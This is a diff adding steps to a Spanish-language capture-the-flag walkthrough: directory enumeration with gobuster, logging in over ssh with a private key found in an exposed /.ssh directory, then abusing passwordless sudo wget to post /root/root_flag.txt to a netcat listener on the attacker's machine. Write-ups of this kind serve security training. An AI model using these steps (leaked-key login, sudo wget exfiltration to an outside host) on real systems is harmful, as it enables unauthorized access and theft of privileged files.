@@ -29,12 +29,32 @@ gobuster dir -u http://IP/sitemap -w /usr/share/wordlists/dirb/common.txt -t 25 
 
 <p>
 Esta vez nos hemos encontrado con un directorio muy interesante  **/.ssh** Cuando nos conectamos a esa página vemos el fichero con la clave privada de ssh. Dado que sólo tenemos un usuario, probamos a conectarnos vía ssh al server. Antes de nada hay que cambiar los permisos al fichero.
+ 
  ```
  $ chmod 600 id_rsa
  $ ssh -i ./id_rsa jessie@ip
  ```
+ Pasen, están en su casa :D
+ La primera bandera a buscar es la de user_flag.txt, la cual está ubicada en .... home de ese user.
  
+ La siguiente bandera es la de root. Lo primero de todo es saber lo que se puede hacer con ese usuario, 
  
+ ```
+ $ sudo -l -l
+ 
+```
+Podemos ejecutar /usr/bin/wget sin meter la clave. Pues adelante.
+Para obtener el fichero root_flag.txt, abrimos un puerto en mi máguina local con un netcat y hacemos un post del fichero root a mi máquina.
+
+```
+En local
+$ nc -lvnp 1234
+
+En el server
+sudo /usr/bin/wget --post-file=/root/root_flag.txt IP_Local:port
+```
+
+ya tenmeos la flag de root.
  
 ### #1	User flag<p>
 ### Solución:
